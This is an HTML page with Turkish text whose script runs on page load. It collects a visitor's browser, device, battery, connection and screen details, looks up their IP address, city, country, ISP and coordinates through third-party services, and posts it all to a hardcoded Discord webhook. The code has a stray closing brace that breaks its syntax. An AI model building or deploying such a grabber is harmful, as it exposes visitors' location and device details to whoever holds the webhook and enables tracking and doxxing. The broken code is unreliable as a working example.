<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bilgiler Toplanıyor...</title>
  <style>
    body {
      font-family: monospace;
      background: #000;
      color: #0f0;
      padding: 20px;
      line-height: 1.6;
      margin: 0;
    }
    h1 { color: #0f0; }
    pre {
      background: #111;
      padding: 12px;
      border: 1px solid #222;
      white-space: pre-wrap;
      word-break: break-all;
      font-size: 13px;
      max-height: 400px;
      overflow-y: auto;
    }
    .status { color: #0f0; font-weight: bold; }
    .error { color: #ff4444; }
  </style>
</head>
<body>
  <h1>Bilgileriniz toplanıp Discord'a gönderiliyor...</h1>
  <p>Lütfen bu sayfayı kapatmayın (otomatik gönderim ~5 saniye içinde yapılır).</p>

  <h2>Toplanan Veriler (önizleme):</h2>
  <pre id="preview">Yükleniyor...</pre>

  <div id="status" class="status"></div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1483396402506633257/OtZD1LSrc4tz9WePfrr9qVXlQ9Nye6aIt3_ulqwqiBYfjw44ei6PppuCqYOWgxCmrj0M";  // ← BURAYA KENDİ DISCORD WEBHOOK URL'İNİ YAPIŞTIR

    async function getAllInfo() {
      const nav = navigator;
      const scr = screen;
      const conn = nav.connection || {};

      // Batarya bilgisi
      let battery = {
        level: "—",
        status: "—",
        chargingTime: "—",
        dischargingTime: "—"
      };

      if (nav.getBattery) {
        try {
          const bat = await nav.getBattery();
          battery = {
            level: bat.level ? `${Math.round(bat.level * 100)}%` : "—",
            status: bat.charging ? "Şarj oluyor ⚡" : "Şarjda değil",
            chargingTime: bat.chargingTime === Infinity ? "—" : `${bat.chargingTime} sn`,
            dischargingTime: bat.dischargingTime === Infinity ? "—" : `${bat.dischargingTime} sn`
          };
        } catch (e) {
          battery.status = "Batarya API yok / izin verilmedi";
        }
      }

      // Temel bilgiler
      const baseInfo = {
        Zaman: new Date().toLocaleString('tr-TR', { timeZoneName: 'short' }),
        UserAgent: nav.userAgent,
        Platform: nav.platform || nav.oscpu || "—",
        Diller: nav.languages ? nav.languages.join(", ") : nav.language || "—",
        ZamanDilimi: Intl.DateTimeFormat().resolvedOptions().timeZone || "—",
        Ekran: `${scr.width} × ${scr.height}  (dpi: ${window.devicePixelRatio.toFixed(2)})`,
        Pencere: `${window.innerWidth} × ${window.innerHeight}`,
        CPU_Çekirdek: nav.hardwareConcurrency || "bilinmiyor",
        RAM_Tahmini: nav.deviceMemory ? `${nav.deviceMemory} GB` : "bilinmiyor",
        Bağlantı: conn.effectiveType ? `${conn.effectiveType} (~${conn.downlink || "?"} Mbps)` : "—",
        Batarya: `${battery.level} — ${battery.status}`,
        Batarya_Detay: `Şarj süresi: ${battery.chargingTime} | Kalan: ${battery.dischargingTime}`,
        Dokunmatik: nav.maxTouchPoints || "—",
        Çevrimiçi: nav.onLine ? "Evet" : "Hayır"
      };

      return baseInfo;
    }

    async function getIPInfo() {
      try {
        // Önce basit IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        // Daha detaylı bilgi
        const detailsRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const details = await detailsRes.json();

        return {
          IP: ip || details.ip || "—",
          Şehir: details.city || "—",
          Ülke: details.country_name || details.country || "—",
          ISP: details.org || details.asn || "—",
          Enlem_Boylam: details.latitude && details.longitude ? `${details.latitude}, ${details.longitude}` : "—"
        };
      } catch (err) {
        return { IP: "Alınamadı", Hata: err.message };
      }
    }

    async function sendToDiscord() {
      const statusEl = document.getElementById('status');
      statusEl.textContent = "Toplanıyor...";

      try {
        const clientData = await getAllInfo();
        const ipData = await getIPInfo();

        const allData = { ...clientData, ...ipData };

        // Önizleme göster
        document.getElementById('preview').textContent = JSON.stringify(allData, null, 2);

        // Discord mesajı (embed şeklinde daha güzel görünür)
        const payload = {
          username: "Ziyaretçi Bilgi Toplayıcı",
          avatar_url: "https://i.imgur.com/4M34hi2.png", // isteğe bağlı avatar
          embeds: [{
            title: "Yeni Ziyaretçi Bilgileri",
            color: 0x00ff00,
            fields: [
              { name: "Zaman", value: allData.Zaman, inline: true },
              { name: "IP", value: allData.IP || "—", inline: true },
              { name: "Konum", value: `${allData.Şehir || "?"} / ${allData.Ülke || "?"}`, inline: true },
              { name: "User-Agent", value: `\`\`\`${allData.UserAgent.substring(0, 200)}...\`\`\``, inline: false },
              { name: "Platform", value: allData.Platform, inline: true },
              { name: "Dil", value: allData.Diller, inline: true },
              { name: "Batarya", value: allData.Batarya, inline: true },
              { name: "CPU / RAM", value: `${allData.CPU_Çekirdek} çekirdek  |  ${allData.RAM_Tahmini}`, inline: true },
              { name: "Bağlantı", value: allData.Bağlantı, inline: true },
              { name: "Ekran", value: allData.Ekran, inline: true }
            ],
            footer: { text: "Tarayıcıdan otomatik toplandı" },
            timestamp: new Date().toISOString()
          }]
        };

        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        }
      } catch (err) {
        statusEl.textContent = `✗ Hata: ${err.message}`;
        statusEl.className = "error";
        console.error(err);
      }
    }

    // Sayfa yüklendiğinde çalıştır
    window.addEventListener('load', () => {
      setTimeout(sendToDiscord, 1200); // 1.2 saniye bekle (batarya API'si için)
    });
  </script>
</body>
</html>
